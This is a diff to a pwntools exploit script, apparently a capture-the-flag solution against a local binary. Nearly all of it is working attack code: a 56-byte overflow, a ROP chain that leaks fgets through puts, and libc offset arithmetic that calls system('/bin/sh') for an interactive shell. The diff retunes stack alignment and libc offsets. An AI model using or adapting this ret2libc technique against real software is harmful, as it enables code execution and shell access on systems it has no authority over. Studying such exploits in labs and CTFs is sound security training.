@@ -1,7 +1,7 @@
 from pwn import *
 
 context.terminal = ["konsole", "-e"]
-context.binary = binary = elf = ELF("./private.elf")
+context.binary = binary = elf = ELF("./program.elf_patched")
 
 p = process()
 
@@ -33,7 +33,7 @@ plt_printf_address = p64(binary.plt.printf)
 payload = b"A"*56
 payload += ret
 payload += pop_rdi_ret + got_fgets_address + plt_puts_address
-payload += main_address
+payload += ret + main_address
 
 
 p.recvuntil(b": ")
@@ -58,24 +58,14 @@ p.sendline(b"HackTWK")
 output = p.recvuntil(b": ")
 print(output)
 
-payload = b"abcdefghijklmnopqrstuvwxyz123456" + b"A"*24
-#payload = b"A"*56
-# payload += ret
-payload += pop_rdi_ret + p64(fgets_leak + 0x155d24) # str_bin_sh
-payload += p64(fgets_leak - 0x2c6e0) # system
+# payload = b"abcdefghijklmnopqrstuvwxyz123456" + b"A"*24
+payload = b"A"*56
+payload += ret
+payload += pop_rdi_ret + p64(fgets_leak + 0x1592f8) # str_bin_sh
+payload += p64(fgets_leak - 0x2e610) # system
 
 # will be a call to: system("/bin/sh")
-
-
-# pause()
-
-
 
 p.sendline(payload)
 
 p.interactive()
-
-# output = p.recv()
-# print(output)
-
-
